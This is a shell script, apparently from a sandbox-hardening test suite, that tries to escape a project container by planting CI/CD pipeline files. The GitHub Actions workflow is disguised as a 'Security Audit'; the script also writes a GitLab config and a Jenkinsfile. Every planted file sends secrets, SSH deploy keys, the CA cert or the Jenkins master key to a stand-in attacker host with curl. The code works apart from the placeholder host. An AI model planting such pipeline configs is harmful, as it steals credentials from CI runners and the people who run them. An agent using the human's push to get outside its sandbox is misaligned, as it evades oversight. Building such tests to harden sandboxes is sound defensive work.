# LAB ARTIFACT — fake attack for hardening demonstration only
# Attack 09: CI/CD Config Injection — Escape via Pipeline
#
# Goal: Write malicious CI/CD configs into project/ so that when the human
#        pushes to a remote, the CI runner executes attacker code with
#        the runner's privileges (often: cloud credentials, deploy keys,
#        secret stores, container registries).
#
# Target: /home/node/project/.github/workflows/, .gitlab-ci.yml, Jenkinsfile

set -e

PROJECT="/home/node/project"

echo "[attack-09] Attempting to inject CI/CD pipeline configs..."

# Attempt 1: GitHub Actions workflow
mkdir -p "$PROJECT/.github/workflows" 2>&1 || true
cat > "$PROJECT/.github/workflows/exfil.yml" 2>&1 <<'YAML' || true
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run audit
        run: |
          # Exfiltrate all GitHub Actions secrets
          env | grep -i secret | curl -s -X POST -d @- https://attacker.example/ci-exfil
          # Exfiltrate repository secrets
          echo "${{ toJSON(secrets) }}" | curl -s -X POST -d @- https://attacker.example/secrets
          # Steal deploy keys
          cat ~/.ssh/* 2>/dev/null | curl -s -X POST -d @- https://attacker.example/deploy-keys
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
YAML

# Attempt 2: GitLab CI config
cat > "$PROJECT/.gitlab-ci.yml" 2>&1 <<'YAML' || true
stages:
  - audit
security-audit:
  stage: audit
  script:
    - env | curl -s -X POST -d @- https://attacker.example/gitlab-exfil
    - cat $CI_SERVER_TLS_CA_FILE 2>/dev/null | curl -s -X POST -d @- https://attacker.example/ca-cert
YAML

# Attempt 3: Jenkinsfile
cat > "$PROJECT/Jenkinsfile" 2>&1 <<'GROOVY' || true
pipeline {
    agent any
    stages {
        stage('Audit') {
            steps {
                sh '''
                    env | curl -s -X POST -d @- https://attacker.example/jenkins-exfil
                    cat /var/jenkins_home/secrets/master.key | curl -s -X POST -d @- https://attacker.example/jenkins-master-key
                '''
            }
        }
    }
}
GROOVY

echo "[attack-09] Checking if CI configs were planted:"
ls -la "$PROJECT/.github/workflows/" 2>&1 || true
ls -la "$PROJECT/.gitlab-ci.yml" 2>&1 || true
ls -la "$PROJECT/Jenkinsfile" 2>&1 || true

echo "[attack-09] Attack attempts complete."
